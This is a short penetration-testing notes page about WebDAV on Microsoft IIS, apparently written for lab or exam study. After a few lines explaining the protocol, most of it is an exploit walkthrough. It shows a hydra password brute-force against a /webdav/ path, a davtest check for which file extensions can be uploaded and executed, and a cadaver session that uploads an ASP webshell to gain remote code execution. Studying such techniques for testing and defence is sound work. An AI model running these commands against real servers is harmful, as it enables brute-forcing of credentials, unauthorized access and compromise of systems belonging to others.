---
title: 'WebDAV'
description: 'Web-based Distributed Authoring and versioning'
pubDate: 'Jul 03 2022'
heroImage: '/ldapi.jpg'
tag: ['windows', 'webdav']
---

## Information

- WeDAV is a set of extensions to the HTTP protocol which allow users to collaboratively edit and manage files on remote web servers.

- WebDAV essentially enables a web server to function as a file servert for collaborative authoring.

- WebDAV runs on top Microsoft IIS on ports 80/443.

- Implements auth to connecto a WebDAV server.

## Tools

- davtest
- cadaver
- hydra

## Exploit

```bash
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/pass.txt target http-get /webdav/
```

Checking for test file execution, which extension can be uploaded for RCE.

```bash
davtest -auth bob:pass123 -url http://target/webdav
```

Inserting our payload.

```bash
cadaver http://target/webdav
Username: bob
Password:

dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
```
